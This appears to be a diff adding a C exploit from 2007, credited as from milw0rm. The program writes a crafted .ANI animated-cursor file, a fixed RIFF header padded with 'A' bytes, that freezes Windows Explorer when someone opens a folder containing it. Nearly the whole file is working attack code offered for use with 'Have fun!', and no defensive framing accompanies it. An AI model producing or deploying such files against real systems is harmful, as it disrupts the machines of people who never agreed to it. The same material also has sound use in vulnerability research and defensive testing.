@@ -1,0 +1,54 @@
+/****************************************************************************
+*              MS Windows Explorer Unspecified .ANI File DoS                *
+*                                                                           *
+*                                                                           *
+* Another .Ani bug that freezes Explorer if you open a folder that contains *
+* a crafted file.                                                           *
+*                                                                           *
+* Tested against Win XP SP2 FR.                                             *
+* Have Fun!                                                                 *
+*                                                                           *
+* Coded by Marsu <Marsupilamipowa@hotmail.fr>                               *
+****************************************************************************/
+
+#include "stdio.h"
+#include "stdlib.h"
+
+unsigned char Ani_headers[] = 
+"\x52\x49\x46\x46\x08\x4d\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68"
+"\x24\x00\x00\x00\x24\x00\x00\x00\x06\x00\x00\x00\x06\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00"
+"\x0a\x00\x00\x00\x01\x00\x00\x00\x72\x61\x74\x65\x18\x00\x00\x00"
+"\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00"
+"\x03\x00\x00\x00\x03\x00\x00\x00\x4c\x49\x53\x54\xa8\x4c\x00\x00"
+"\x66\x72\x61\x6d\x69\x63\x6f\x6e\xbe\x0c\x00\x00\x00\x00\x02\x00"
+"\x01\x00\x20\x20\x00\x57\x57\x57\x57\x00\xa8\x0c\x00\x00\x16\x00"
+"\x00\x00\x03" //Change this last char to avoid crash
+;
+
+int main(int argc, char* argv[])
+{
+	FILE* anifile;
+	char evilbuff[4000];
+	printf("[+] MS Windows Explorer Unspecified .ANI File DoS\n");
+	printf("[+] Coded by Marsu <Marsupilamipowa@hotmail.fr>\n");
+	if (argc!=2) {
+		printf("[+] Usage: %s <file.ani>\n",argv[0]);
+		return 0;
+	}
+	
+	memset(evilbuff,'A',4000);
+	memcpy(evilbuff,Ani_headers,sizeof(Ani_headers)-1);
+	
+	if ((anifile=fopen(argv[1],"wb"))==0) {
+		printf("[-] Unable to access file.\n");
+		return 0;
+	}
+	fwrite( evilbuff, 1, 4000, anifile );
+	fclose(anifile);
+	printf("[+] Done. Have fun!\n");
+	return 0;
+	
+}
+
+// milw0rm.com [2007-04-08]
